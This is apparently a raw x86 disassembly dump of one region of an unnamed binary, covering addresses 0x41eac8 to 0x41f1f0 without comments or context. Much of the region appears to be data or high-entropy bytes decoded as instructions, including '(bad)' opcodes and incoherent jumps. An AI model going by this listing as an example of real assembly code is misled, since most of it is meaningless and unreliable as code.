  41eac8:	xor    BYTE PTR [edi+0x62],cl
  41eacb:	dec    edi
  41eacc:	ds dec edi
  41eace:	inc    ecx
  41eacf:	dec    edi
  41ead0:	cmp    ecx,DWORD PTR [edi+0x32]
  41ead3:	dec    edi
  41ead4:	cmp    DWORD PTR [edi+0x1e],ecx
  41ead7:	add    bl,BYTE PTR [edi]
  41ead9:	add    ecx,DWORD PTR [edi]
  41eadb:	adc    ecx,DWORD PTR [eax+edx*1]
  41eade:	jl     0x41eb00
  41eae0:	jge    0x41eb03
  41eae2:	aas    
  41eae3:	dec    edi
  41eae4:	add    BYTE PTR [eax],al
  41eae6:	outs   dx,BYTE PTR ds:[esi]
  41eae7:	jmp    0xeba3eb2d
  41eaec:	inc    ecx
  41eaed:	add    BYTE PTR [edx-0x15],ch
  41eaf0:	inc    ecx
  41eaf1:	add    BYTE PTR [edx],ch
  41eaf3:	in     eax,dx
  41eaf4:	inc    ecx
  41eaf5:	add    BYTE PTR [esi+0x1a0041ec],cl
  41eafb:	in     eax,dx
  41eafc:	inc    ecx
  41eafd:	add    BYTE PTR [edx-0x15],cl
  41eb00:	inc    ecx
  41eb01:	add    BYTE PTR [esi-0x15],cl
  41eb04:	inc    ecx
  41eb05:	add    BYTE PTR [edx],dl
  41eb07:	in     eax,dx
  41eb08:	inc    ecx
  41eb09:	add    BYTE PTR [edx-0x4effbe15],dh
  41eb0f:	test   eax,0xbab8f89c
  41eb14:	pushf  
  41eb15:	clc    
  41eb16:	data16 jmp 0x41eb5a
  41eb19:	add    BYTE PTR [edx-0x14],cl
  41eb1c:	inc    ecx
  41eb1d:	add    BYTE PTR [esi-0x14],bl
  41eb20:	inc    ecx
  41eb21:	add    BYTE PTR [edx-0x14],ch
  41eb24:	inc    ecx
  41eb25:	add    BYTE PTR [edx-0x14],bh
  41eb28:	inc    ecx
  41eb29:	add    BYTE PTR [esi+0x6a0041eb],bl
  41eb2f:	jmp    0xebffeb75
  41eb34:	inc    ecx
  41eb35:	add    BYTE PTR [esi+0x2e0041eb],ch
  41eb3b:	in     eax,dx
  41eb3c:	inc    ecx
  41eb3d:	add    BYTE PTR [eax],bh
  41eb3f:	test   DWORD PTR [eax+edi*8-0x7ee8f463],ebx
  41eb46:	jb     0x41eb33
  41eb48:	inc    ecx
  41eb49:	add    BYTE PTR [edx-0x717ee9e4],bl
  41eb4f:	or     eax,0x705
  41eb54:	inc    eax
  41eb55:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  41eb59:	fnsave [ebp-0x59]
  41eb5c:	inc    edx
  41eb5d:	add    BYTE PTR [edx+0x68],dh
  41eb60:	inc    ebp
  41eb61:	inc    ecx
  41eb62:	mov    ?,edx
  41eb64:	jne    0x41ebc8
  41eb66:	mov    gs,ebp
  41eb68:	inc    BYTE PTR [edi]
  41eb6a:	mov    edi,0x5a05a3fa
  41eb6f:	jmp    0x41ebb2
  41eb71:	add    BYTE PTR [ecx],bh
  41eb73:	xchg   ebp,eax
  41eb74:	pushf  
  41eb75:	clc    
  41eb76:	cmp    DWORD PTR [esi-0x6ac50764],edx
  41eb7c:	pushf  
  41eb7d:	clc    
  41eb7e:	cmp    edx,DWORD PTR [ebp-0x6ac30764]
  41eb84:	pushf  
  41eb85:	clc    
  41eb86:	cmp    eax,0x3ef89c95
  41eb8b:	xchg   ebp,eax
  41eb8c:	pushf  
  41eb8d:	clc    
  41eb8e:	aas    
  41eb8f:	xchg   ebp,eax
  41eb90:	pushf  
  41eb91:	clc    
  41eb92:	and    BYTE PTR [ebp-0x6ade0764],dl
  41eb98:	pushf  
  41eb99:	clc    
  41eb9a:	sub    BYTE PTR [ebp-0x6130764],dl
  41eba0:	add    esp,DWORD PTR [eax+0x62]
  41eba3:	jmp    0x728bebe9
  41eba8:	inc    edx
  41eba9:	add    BYTE PTR [ecx+0x49],bl
  41ebac:	imul   di,WORD PTR [eax],0xff85
  41ebb0:	pushf  
  41ebb1:	clc    
  41ebb2:	popf   
  41ebb3:	jmp    0xb54f308
  41ebb8:	add    BYTE PTR [eax],al
  41ebba:	pop    esi
  41ebbb:	jmp    0xbdcec01
  41ebc0:	add    al,0xe
	...
  41ebf2:	add    BYTE PTR [eax],dl
  41ebf4:	inc    eax
  41ebf5:	add    BYTE PTR [esi-0x7e],ch
  41ebf8:	inc    edx
  41ebf9:	add    BYTE PTR [eax],al
  41ebfb:	add    BYTE PTR [eax],al
  41ebfd:	add    BYTE PTR [ecx+0x0],cl
  41ec00:	inc    esp
  41ec01:	add    BYTE PTR [ecx+0x0],ch
  41ec04:	add    BYTE PTR fs:[ebx+0x0],cl
  41ec08:	dec    edx
  41ec09:	add    BYTE PTR [ebx+0x0],cl
  41ec0c:	dec    edx
  41ec0d:	add    BYTE PTR [eax+eax*1+0x6b],al
  41ec11:	add    BYTE PTR [eax+eax*1+0x6a],ch
  41ec15:	add    BYTE PTR [eax+eax*1+0x4c],al
  41ec19:	add    BYTE PTR [ecx+0x0],cl
  41ec1c:	inc    esp
  41ec1d:	add    BYTE PTR [eax+eax*1+0x49],cl
  41ec21:	add    BYTE PTR [ebp+0x0],dl
  41ec24:	dec    edx
  41ec25:	add    BYTE PTR [ebx+0x0],cl
  41ec28:	inc    esp
  41ec29:	add    BYTE PTR [eax+eax*1+0x4a],cl
  41ec2d:	add    BYTE PTR [ebx+0x0],cl
  41ec30:	dec    eax
  41ec31:	add    BYTE PTR [eax+eax*1+0x4a],al
  41ec35:	add    BYTE PTR [eax],al
  41ec37:	add    BYTE PTR [eax],al
  41ec39:	add    dh,bh
  41ec3b:	jmp    0x41ec7e
	...
  41ec45:	add    BYTE PTR [eax+0x59004191],bl
  41ec4b:	dec    edi
  41ec4c:	pop    edi
  41ec4d:	dec    edi
  41ec4e:	inc    eax
  41ec4f:	dec    edi
  41ec50:	inc    esp
  41ec51:	dec    edi
  41ec52:	pop    edi
  41ec53:	dec    edi
  41ec54:	inc    esi
  41ec55:	dec    edi
  41ec56:	add    DWORD PTR [edi+0x0],ecx
  41ec59:	dec    edi
  41ec5a:	xor    cl,BYTE PTR [edi+0x0]
  41ec5d:	add    BYTE PTR [ebp+0x4f],bl
  41ec60:	pop    esi
  41ec61:	dec    edi
  41ec62:	pop    ebx
  41ec63:	dec    edi
  41ec64:	add    DWORD PTR [edi+0x0],ecx
  41ec67:	dec    edi
  41ec68:	xor    cl,BYTE PTR [edi+0x4f]
  41ec6b:	dec    edi
  41ec6c:	inc    ecx
  41ec6d:	dec    edi
  41ec6e:	pop    edi
  41ec6f:	dec    edi
  41ec70:	inc    eax
  41ec71:	dec    edi
  41ec72:	add    DWORD PTR [edi+0x0],ecx
  41ec75:	dec    edi
  41ec76:	xor    cl,BYTE PTR [edi+0x0]
  41ec79:	add    BYTE PTR [ecx+0x4f],al
  41ec7c:	pop    edx
  41ec7d:	dec    edi
  41ec7e:	inc    esi
  41ec7f:	dec    edi
  41ec80:	dec    ebp
  41ec81:	dec    edi
  41ec82:	push   ebx
  41ec83:	dec    edi
  41ec84:	inc    edx
  41ec85:	dec    edi
  41ec86:	pop    ebx
  41ec87:	dec    edi
  41ec88:	xor    cl,BYTE PTR [edi+0x0]
  41ec8b:	add    BYTE PTR [eax],al
  41ec8d:	add    BYTE PTR [esi+0x7d],ch
  41ec90:	outs   dx,BYTE PTR ds:[esi]
  41ec91:	lea    ebp,[esi-0x63]
  41ec94:	outs   dx,BYTE PTR ds:[esi]
  41ec95:	lods   eax,DWORD PTR ds:[esi]
  41ec96:	outs   dx,BYTE PTR ds:[esi]
  41ec97:	mov    ebp,0xdd6ecd6e
  41ec9c:	outs   dx,BYTE PTR ds:[esi]
  41ec9d:	in     eax,dx
  41ec9e:	outs   dx,BYTE PTR ds:[esi]
  41ec9f:	std    
  41eca0:	outs   dx,BYTE PTR ds:[esi]
  41eca1:	or     eax,0x2d6e1d6e
  41eca6:	outs   dx,BYTE PTR ds:[esi]
  41eca7:	cmp    eax,0x6d6e5d6e
  41ecac:	outs   dx,BYTE PTR ds:[esi]
  41ecad:	jb     0x41ed1d
  41ecaf:	jae    0x41ed1f
  41ecb1:	jo     0x41ed21
  41ecb3:	jno    0x41ed23
  41ecb5:	jbe    0x41ed25
  41ecb7:	ja     0x41ed27
  41ecb9:	je     0x41ed29
  41ecbb:	jne    0x41ed2b
  41ecbd:	mov    ch,BYTE PTR [esi-0x75]
  41ecc0:	outs   dx,BYTE PTR ds:[esi]
  41ecc1:	mov    BYTE PTR [esi-0x77],ch
  41ecc4:	outs   dx,BYTE PTR ds:[esi]
  41ecc5:	mov    gs,WORD PTR [esi+0x7c]
  41ecc8:	pop    esi
  41ecc9:	jge    0x41ed19
  41eccb:	jge    0x41ec8b
  41eccd:	jge    0x41ed2b
  41eccf:	(bad)  
  41ecd0:	jge    0x41ed42
  41ecd2:	mov    ebp,0x71736eb1
  41ecd7:	bound  ebp,QWORD PTR [edx+0x70265fc6]
  41ecdd:	add    BYTE PTR [ebp+0x17],cl
  41ece0:	mov    ebx,0x4af4bd56
  41ece5:	aaa    
  41ece6:	dec    edx
  41ece7:	jle    0x41ec86
  41ece9:	jno    0x41ed3f
  41eceb:	mov    cl,0x8
  41eced:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d8],0x48
  41ecf5:	xlat   BYTE PTR ds:[ebx]
  41ecf6:	lds    edx,FWORD PTR [ebx+0x7dc4114c]
  41ecfc:	ret    
  41ecfd:	fidiv  WORD PTR [edi]
  41ecff:	into   
  41ed00:	mul    BYTE PTR [esi+0x1faa3204]
  41ed06:	push   0xc5c644f1
  41ed0b:	sbb    ch,al
  41ed0d:	jno    0x41ed0f
  41ed0f:	add    BYTE PTR [eax],al
  41ed11:	add    dh,ch
  41ed13:	(bad)  [ebx+0x7]
  41ed16:	mov    edx,0x450041eb
  41ed1b:	das    
  41ed1c:	shl    BYTE PTR [edx],0xb4
  41ed1f:	rol    BYTE PTR [ecx+0x0],1
  41ed22:	inc    esi
  41ed23:	push   ebx
  41ed24:	outs   dx,DWORD PTR ds:[esi]
  41ed25:	push   ebx
  41ed26:	push   edx
  41ed27:	jmp    0x41ed6a
  41ed29:	add    BYTE PTR [esi-0x71ffbe15],dh
  41ed2f:	in     eax,dx
  41ed30:	adc    al,BYTE PTR [edi]
  41ed32:	jae    0x41ed9d
  41ed34:	inc    edx
  41ed35:	jae    0x41ed9c
  41ed37:	popa   
  41ed38:	push   ecx
  41ed39:	pop    eax
  41ed3a:	pop    ecx
  41ed3b:	outs   dx,BYTE PTR ds:[esi]
  41ed3c:	jbe    0x41edb6
  41ed3e:	jns    0x41ed94
  41ed40:	push   ecx
  41ed41:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  41ed45:	je     0x41edb6
  41ed47:	jns    0x41edb7
  41ed49:	popa   
  41ed4a:	push   esi
  41ed4b:	push   ebp
  41ed4c:	push   0x57564476
  41ed51:	dec    edx
  41ed52:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  41ed59:	popa   
	...
  41ed6e:	jp     0x41edc4
  41ed70:	arpl   WORD PTR [ecx+0x4b],cx
  41ed73:	push   edx
  41ed74:	imul   ebp,DWORD PTR [eax+0x45],0x55487459
  41ed7b:	jp     0x41ede9
  41ed7d:	jb     0x41edd2
  41ed7f:	outs   dx,DWORD PTR ds:[esi]
  41ed80:	push   ebx
  41ed81:	inc    esi
  41ed82:	inc    edi
  41ed83:	push   0x66495949
  41ed88:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  41ed8c:	push   esi
  41ed8d:	jb     0x41edf7
  41ed8f:	add    BYTE PTR [ecx+0x43],ah
  41ed92:	push   ecx
  41ed93:	ins    BYTE PTR es:[edi],dx
  41ed94:	pop    eax
  41ed95:	ja     0x41ede4
  41ed97:	je     0x41ee0f
  41ed99:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  41ed9d:	add    BYTE PTR [edi+0x56],dl
  41eda0:	push   esp
  41eda1:	dec    eax
  41eda2:	je     0x41edf0
  41eda4:	push   ebx
  41eda5:	jne    0x41ee12
  41eda7:	popa   
  41eda8:	jns    0x41edaa
  41edaa:	dec    edi
  41edab:	push   esp
  41edac:	dec    edi
  41edad:	dec    ebx
  41edae:	pop    edi
  41edaf:	pop    ebx
  41edb0:	dec    edi
  41edb1:	push   esp
  41edb2:	add    bl,BYTE PTR [esi]
  41edb4:	adc    ch,BYTE PTR ds:0x8c73970c
  41edba:	push   eax
  41edbb:	jge    0x41edbe
  41edbd:	add    BYTE PTR [ecx-0x2cfffffa],al
  41edc3:	push   ebp
  41edc4:	iret   
  41edc5:	sbb    al,0xfb
  41edc7:	dec    ecx
  41edc8:	xor    ecx,ecx
  41edca:	xchg   ebp,eax
  41edcb:	adc    al,0xb8
  41edcd:	jle    0x41ee4d
  41edcf:	out    0xd1,al
  41edd1:	shl    al,0xdc
  41edd4:	dec    eax
  41edd5:	dec    esi
  41edd6:	sbb    DWORD PTR [ebx-0x2e319d3a],edx
  41eddc:	add    ebx,DWORD PTR [esp+edx*2+0xc]
  41ede0:	call   0x870ad632
  41ede5:	sbb    eax,0x13cade33
  41edea:	imul   eax,edi,0x3ffca947
  41edf0:	sti    
  41edf1:	inc    eax
  41edf2:	dec    esi
  41edf3:	call   DWORD PTR [esi-0x2912fa1d]
  41edf9:	fld    TBYTE PTR [esi-0x23e67647]
  41edff:	test   al,0x4b
  41ee01:	sbb    al,0xcf
  41ee03:	lahf   
  41ee04:	imul   edi,DWORD PTR [ecx],0xffffffeb
  41ee07:	mov    cl,0xdf
  41ee09:	shl    DWORD PTR [ebp-0x7d419ef2],0xa5
  41ee10:	test   al,0xab
  41ee12:	pop    eax
  41ee13:	push   cs
  41ee14:	pusha  
  41ee15:	mov    eax,ds:0x7edec764
  41ee1a:	addr16 cmc 
  41ee1c:	inc    esp
  41ee1d:	ret    0x1ce5
  41ee20:	out    dx,eax
  41ee21:	cwde   
  41ee22:	js     0x41ee25
  41ee24:	push   eax
  41ee25:	inc    esp
  41ee26:	sbb    BYTE PTR [esi+ebx*8],dh
  41ee29:	jbe    0x41ee6c
  41ee2b:	leave  
  41ee2c:	mov    al,ds:0x5fd2d280
  41ee31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee32:	or     ebx,edx
  41ee34:	cmp    al,0xfa
  41ee36:	imul   edi,ebx,0xffffffa2
  41ee39:	aam    0x3f
  41ee3b:	mov    ds,esp
  41ee3d:	nop
  41ee3e:	mov    ebx,DWORD PTR [edx]
  41ee40:	xchg   esp,eax
  41ee41:	shl    DWORD PTR [eax-0x3a],cl
  41ee44:	sub    BYTE PTR [edi],0x4c
  41ee47:	push   ebp
  41ee48:	in     eax,dx
  41ee49:	stos   BYTE PTR es:[edi],al
  41ee4a:	je     0x41ee9b
  41ee4c:	loope  0x41ee54
  41ee4e:	sub    eax,DWORD PTR [edi+ecx*2]
  41ee51:	mov    ah,0x39
  41ee53:	add    BYTE PTR [ecx-0x482f0159],0xae
  41ee5a:	add    DWORD PTR [ebx],edi
  41ee5c:	mov    gs,WORD PTR [edi]
  41ee5e:	mov    esi,0xb0145f18
  41ee63:	pop    ecx
  41ee64:	fist   DWORD PTR [edx-0x7641cfdb]
  41ee6a:	add    al,0x77
  41ee6c:	iret   
  41ee6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee6e:	sbb    esp,DWORD PTR [eax+0x12]
  41ee71:	outs   dx,DWORD PTR ds:[esi]
  41ee72:	or     BYTE PTR [eax-0x73],0xb6
  41ee76:	mov    ebp,0xb559ab8e
  41ee7b:	ja     0x41ee96
  41ee7d:	add    BYTE PTR [ebp-0x176cd480],0x28
  41ee84:	outs   dx,BYTE PTR ds:[esi]
  41ee85:	push   edi
  41ee86:	int    0x72
  41ee88:	and    BYTE PTR [ebx+0x52],ah
  41ee8b:	adc    ebp,esi
  41ee8d:	out    dx,al
  41ee8e:	stos   BYTE PTR es:[edi],al
  41ee8f:	jg     0x41eee1
  41ee91:	ret    
  41ee92:	repnz stos BYTE PTR es:[edi],al
  41ee94:	mov    ah,0x16
  41ee96:	dec    edi
  41ee97:	mov    ds:0x32a35f66,al
  41ee9c:	jmp    0x5868:0xb97076f
  41eea3:	dec    ebp
  41eea4:	sbb    al,0x6d
  41eea6:	inc    esp
  41eea7:	arpl   WORD PTR [eax],di
  41eea9:	xchg   esi,eax
  41eeaa:	inc    ebx
  41eeab:	push   ss
  41eeac:	push   0x32c6800b
  41eeb1:	jmp    DWORD PTR [eax]
  41eeb3:	add    al,0xac
  41eeb5:	lock mov ah,0x2e
  41eeb8:	push   edi
  41eeb9:	or     ebx,DWORD PTR [ebp+0x143adad9]
  41eebf:	js     0x41eeea
  41eec1:	fistp  QWORD PTR [ebx]
  41eec3:	xor    DWORD PTR [edx],0x4c
  41eec6:	inc    edi
  41eec7:	test   al,0x46
  41eec9:	test   eax,0x9361903b
  41eece:	xchg   edi,eax
  41eecf:	sbb    esi,DWORD PTR [ebx+0x3f]
  41eed2:	and    eax,DWORD PTR [ebp+eax*1+0x56]
  41eed6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eed7:	sbb    DWORD PTR [ecx-0x6c],edi
  41eeda:	inc    ebp
  41eedb:	jae    0x41eece
  41eedd:	xlat   BYTE PTR ds:[ebx]
  41eede:	dec    ebx
  41eedf:	outs   dx,DWORD PTR ds:[esi]
  41eee0:	mov    ecx,DWORD PTR [edi]
  41eee2:	or     ch,al
  41eee4:	push   ecx
  41eee5:	cmovl  ecx,DWORD PTR [ecx]
  41eee8:	sbb    bl,BYTE PTR [ecx+0x5cfaae12]
  41eeee:	adc    eax,0x23b6e1c8
  41eef3:	jb     0x41eedf
  41eef5:	imul   DWORD PTR [si-0x5e86]
  41eefa:	js     0x41ef4e
  41eefc:	mov    edi,0xe60b2c35
  41ef01:	push   es
  41ef02:	xor    eax,eax
  41ef04:	jl     0x41ef4c
  41ef06:	and    al,bl
  41ef08:	xor    eax,0xc1c7529e
  41ef0d:	add    al,0x71
  41ef0f:	outs   dx,BYTE PTR ds:[esi]
  41ef10:	call   0x4dd19109
  41ef15:	or     eax,0x68ce8f6b
  41ef1a:	mov    bh,0xc9
  41ef1c:	sbb    eax,0xf8fb873e
  41ef21:	icebp  
  41ef22:	shl    DWORD PTR [edx],1
  41ef24:	mov    al,ds:0xfcbaf974
  41ef29:	mov    ecx,0xd6ee4f00
  41ef2e:	mov    cl,0x9f
  41ef30:	mov    ds:0x67fae186,al
  41ef35:	xchg   ebx,eax
  41ef36:	aad    0x1b
  41ef38:	rcl    BYTE PTR [eax],cl
  41ef3a:	in     eax,0x7f
  41ef3c:	repz aad 0x6e
  41ef3f:	sahf   
  41ef40:	add    BYTE PTR [esi],al
  41ef42:	ja     0x41efba
  41ef44:	push   ebp
  41ef45:	add    BYTE PTR [eax-0x7cb75a81],al
  41ef4b:	mov    ecx,esi
  41ef4d:	pop    ebp
  41ef4e:	or     edx,DWORD PTR [ecx]
  41ef50:	dec    BYTE PTR [eax]
  41ef52:	xchg   edx,eax
  41ef53:	adc    ch,BYTE PTR [esi]
  41ef55:	xor    DWORD PTR [edx],edx
  41ef57:	sahf   
  41ef58:	jb     0x41ef20
  41ef5a:	xor    eax,0x28f7d0c5
  41ef5f:	mov    ah,BYTE PTR [ecx-0x68]
  41ef62:	imul   ecx,DWORD PTR ds:0x948a8b40,0xffffffcb
  41ef69:	pop    ebp
  41ef6a:	ds aas 
  41ef6c:	popa   
  41ef6d:	jp     0x41ef46
  41ef6f:	rol    DWORD PTR ds:[ebp+0x47],1
  41ef73:	push   esi
  41ef74:	stc    
  41ef75:	inc    eax
  41ef76:	add    bh,dh
  41ef78:	mov    ds:0xa41ab085,al
  41ef7d:	shl    DWORD PTR [ebx-0x5aee4b12],0x10
  41ef84:	mov    dl,0x7d
  41ef86:	mov    cl,0xe0
  41ef88:	xor    esi,ebp
  41ef8a:	pop    ss
  41ef8b:	scas   al,BYTE PTR es:[edi]
  41ef8c:	dec    BYTE PTR [eax+0x1a78c4a9]
  41ef92:	adc    ch,BYTE PTR [ebp+0x58377d3c]
  41ef98:	xor    al,0xff
  41ef9a:	cmp    al,0x7b
  41ef9c:	cwde   
  41ef9d:	call   0x1b1c7942
  41efa2:	imul   edx,esi,0xe0065c2
  41efa8:	ss cdq 
  41efaa:	iret   
  41efab:	fstp   DWORD PTR [esi-0xa]
  41efae:	aad    0x46
  41efb0:	and    DWORD PTR ds:0x9cfacb57,edx
  41efb6:	dec    eax
  41efb7:	fstp   TBYTE PTR [esi]
  41efb9:	push   es
  41efba:	xor    esi,edi
  41efbc:	pop    ebx
  41efbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41efbe:	jecxz  0x41efcf
  41efc0:	jge    0x41ef5d
  41efc2:	ret    0x6fbd
  41efc5:	cmp    BYTE PTR [ebx+ecx*2],dl
  41efc8:	jge    0x41f044
  41efca:	pop    esp
  41efcb:	push   ebx
  41efcc:	xchg   ecx,eax
  41efcd:	jno    0x41ef7a
  41efcf:	shl    BYTE PTR [ebp-0x71],1
  41efd2:	test   DWORD PTR [edx-0x74129856],esp
  41efd8:	and    BYTE PTR [esi],0xf
  41efdb:	sub    eax,0xf7bcb4fc
  41efe0:	add    eax,0xbd734b85
  41efe5:	les    ecx,FWORD PTR [eax-0x6]
  41efe8:	mov    eax,0xd61d2e64
  41efed:	push   es
  41efee:	aad    0x6
  41eff0:	jnp    0x41f068
  41eff2:	pop    esi
  41eff3:	cld    
  41eff4:	xchg   edi,eax
  41eff5:	and    eax,0x732f1764
  41effa:	(bad)  
  41effb:	xchg   BYTE PTR [eax+edi*4],ah
  41effe:	shl    BYTE PTR [ebp+0x40363802],1
  41f004:	jbe    0x41f07b
  41f006:	cdq    
  41f007:	ror    BYTE PTR [esi+0x5510a83],0x75
  41f00e:	jbe    0x41f05c
  41f010:	push   es
  41f011:	jp     0x41f056
  41f013:	mov    dh,0x1e
  41f015:	fcomp  st(4)
  41f017:	and    al,0xfe
  41f019:	and    DWORD PTR [ebx+0x18],esp
  41f01c:	dec    ebp
  41f01d:	pop    edx
  41f01e:	sub    DWORD PTR [esi],0xbb523021
  41f024:	stos   DWORD PTR es:[edi],eax
  41f025:	ss adc ah,ch
  41f028:	jle    0x41f02d
  41f02a:	lds    esp,FWORD PTR [ecx+0x4a9505ae]
  41f030:	add    eax,0x2af3ccda
  41f035:	add    eax,0x834e60f1
  41f03a:	and    eax,0x8648a599
  41f03f:	retf   0x7543
  41f042:	ficomp DWORD PTR [ecx-0x78]
  41f045:	jbe    0x41efcc
  41f047:	fnstcw WORD PTR [esi]
  41f049:	xchg   edi,eax
  41f04a:	push   edi
  41f04b:	rcl    DWORD PTR [ebx],1
  41f04d:	enter  0x3f6b,0xec
  41f051:	and    BYTE PTR [ebp+0x405949be],ah
  41f057:	outs   dx,DWORD PTR ds:[esi]
  41f058:	retf   0x35d1
  41f05b:	add    al,0x81
  41f05d:	mov    cl,ah
  41f05f:	or     esp,ebx
  41f061:	dec    ecx
  41f062:	fcom   DWORD PTR [esi]
  41f064:	es sti 
  41f066:	pop    esi
  41f067:	push   ecx
  41f068:	push   edi
  41f069:	hlt    
  41f06a:	fwait
  41f06b:	sub    DWORD PTR [edx+0x4],ecx
  41f06e:	scas   al,BYTE PTR es:[edi]
  41f06f:	je     0x41f031
  41f071:	iret   
  41f072:	mov    eax,0x7b429aa8
  41f077:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f078:	cmp    ecx,DWORD PTR [edi+0x5a78dfb9]
  41f07e:	aas    
  41f07f:	ror    BYTE PTR [ebp+ebp*2-0x3bd1b682],1
  41f086:	pop    es
  41f087:	sub    BYTE PTR ds:0xc4ae2e4e,cl
  41f08d:	push   ss
  41f08e:	mov    esi,0xcbba1a02
  41f093:	clc    
  41f094:	pop    ds
  41f095:	dec    esp
  41f096:	and    al,0x82
  41f098:	cmp    BYTE PTR [ebx-0xff2326a],ah
  41f09e:	in     al,dx
  41f09f:	loope  0x41f0b8
  41f0a1:	push   ss
  41f0a2:	aad    0xa2
  41f0a4:	mov    ?,WORD PTR [edx+0x6d134115]
  41f0aa:	add    BYTE PTR fs:[esi+eiz*2-0x64fa9ef8],ah
  41f0b2:	aad    0xdf
  41f0b4:	push   ss
  41f0b5:	push   ss
  41f0b6:	jnp    0x41f110
  41f0b8:	or     eax,DWORD PTR [edx]
  41f0ba:	dec    esp
  41f0bb:	fcomp  st(2)
  41f0bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0be:	cmp    BYTE PTR [edx-0x65],dl
  41f0c1:	sbb    edi,ecx
  41f0c3:	xor    BYTE PTR [esi+0x7c],dl
  41f0c6:	repz sbb ah,BYTE PTR [ebx-0x52]
  41f0ca:	fcomp  DWORD PTR [ebp+0x45]
  41f0cd:	mov    cl,BYTE PTR [ecx-0x7d9e082d]
  41f0d3:	scas   eax,DWORD PTR es:[edi]
  41f0d4:	add    al,0x73
  41f0d6:	jl     0x41f107
  41f0d8:	sahf   
  41f0d9:	das    
  41f0da:	lods   eax,DWORD PTR ds:[esi]
  41f0db:	sbb    DWORD PTR [esi-0x997bccd],eax
  41f0e1:	sbb    al,0x61
  41f0e3:	jbe    0x41f09e
  41f0e5:	inc    DWORD PTR [ecx+0x1f721afa]
  41f0eb:	mov    ch,0x6
  41f0ed:	out    0x79,eax
  41f0ef:	jnp    0x41f0e5
  41f0f1:	fwait
  41f0f2:	inc    esp
  41f0f3:	xchg   DWORD PTR [ebp-0x38],eax
  41f0f6:	fnstsw WORD PTR [edx+0x42]
  41f0f9:	test   DWORD PTR [esi+0x48d00707],ebx
  41f0ff:	and    bl,BYTE PTR [edi-0x3b]
  41f102:	gs jb  0x41f0d9
  41f105:	xchg   ebp,eax
  41f106:	ins    DWORD PTR es:[edi],dx
  41f107:	cmp    DWORD PTR [edi-0x6532ee2f],edx
  41f10d:	jmp    0x41f0f2
  41f10f:	daa    
  41f110:	es fwait
  41f112:	jo     0x41f159
  41f114:	clc    
  41f115:	dec    eax
  41f116:	cmp    esp,edx
  41f118:	and    bl,BYTE PTR [esi]
  41f11a:	ds nop
  41f11c:	pusha  
  41f11d:	stos   BYTE PTR es:[edi],al
  41f11e:	test   al,0x7
  41f120:	xor    DWORD PTR [ebp-0x2e],ebx
  41f123:	call   edx
  41f125:	or     DWORD PTR [edi+edx*2+0x1c936ce3],edx
  41f12c:	add    al,0x75
  41f12e:	sub    DWORD PTR [esi],eax
  41f130:	ret    
  41f131:	imul   edx,esp,0xffffffd8
  41f134:	jno    0x41f122
  41f136:	mov    cl,bh
  41f138:	adc    al,0x80
  41f13a:	push   ecx
  41f13b:	jnp    0x41f13e
  41f13d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f13e:	adc    BYTE PTR [esi],bl
  41f140:	mov    esp,ecx
  41f142:	adc    edx,edi
  41f144:	fs and esp,edx
  41f147:	or     DWORD PTR ds:0x3b9763a9,ebp
  41f14d:	scas   al,BYTE PTR es:[edi]
  41f14e:	ret    0x9030
  41f151:	pop    ecx
  41f152:	mov    edi,0xe0f99172
  41f157:	sub    dl,bl
  41f159:	test   DWORD PTR [eax+0x2a],ebx
  41f15c:	pop    ss
  41f15d:	ficom  DWORD PTR ds:0x9d61efaa
  41f163:	loopne 0x41f115
  41f165:	or     ebx,DWORD PTR [eax+0x65]
  41f168:	loope  0x41f0f7
  41f16a:	ds loop 0x41f142
  41f16d:	jnp    0x41f144
  41f16f:	pop    ebp
  41f170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f171:	adc    DWORD PTR [ecx],ecx
  41f173:	cmp    ebp,DWORD PTR [esi]
  41f175:	push   cs
  41f176:	fcomp  st(2)
  41f178:	pop    edi
  41f179:	xchg   ebx,eax
  41f17a:	out    dx,al
  41f17b:	mov    WORD PTR [edi-0x6e49a168],ds
  41f181:	pushf  
  41f182:	mov    ds:0xaeb5981,al
  41f187:	shl    ebp,1
  41f189:	repz sub WORD PTR [esi+0x75a08887],bx
  41f191:	dec    ecx
  41f192:	push   ebx
  41f193:	lods   eax,DWORD PTR ds:[esi]
  41f194:	jae    0x41f17c
  41f196:	jb     0x41f1ec
  41f198:	xor    edi,DWORD PTR [ecx-0xb]
  41f19b:	les    ebp,FWORD PTR [eax-0x29]
  41f19e:	push   edx
  41f19f:	jo     0x41f129
  41f1a1:	add    eax,DWORD PTR [eax+0x215cee74]
  41f1a7:	das    
  41f1a8:	jmp    DWORD PTR [esi+0x2f]
  41f1ab:	or     DWORD PTR [esi],ecx
  41f1ad:	arpl   WORD PTR [ecx-0x54],bp
  41f1b0:	or     esi,DWORD PTR ss:[edx-0x412c5417]
  41f1b7:	dec    edi
  41f1b8:	leave  
  41f1b9:	es jmp 0x6f67:0xd01043aa
  41f1c1:	xchg   ebp,eax
  41f1c2:	push   esp
  41f1c3:	cmp    edx,ecx
  41f1c5:	xchg   esp,eax
  41f1c6:	inc    eax
  41f1c7:	pop    edx
  41f1c8:	in     al,0xd0
  41f1ca:	mov    dl,0x44
  41f1cc:	pop    eax
  41f1cd:	imul   esi,esi,0x5f447b82
  41f1d3:	inc    esi
  41f1d4:	or     BYTE PTR [edx-0x1460ec46],ch
  41f1da:	inc    esi
  41f1db:	fdiv   QWORD PTR [ebx+0x64]
  41f1de:	retf   0xa3a4
  41f1e1:	xchg   ecx,eax
  41f1e2:	fcomp  QWORD PTR [edx]
  41f1e4:	xchg   esi,eax
  41f1e5:	add    esi,DWORD PTR [esi+0x15]
  41f1e8:	adc    eax,0xefd5ac08
  41f1ed:	pop    esp
  41f1ee:	pushaw 
  41f1f0:	adc    DWORD PTR [esi+0x56f42326],edx
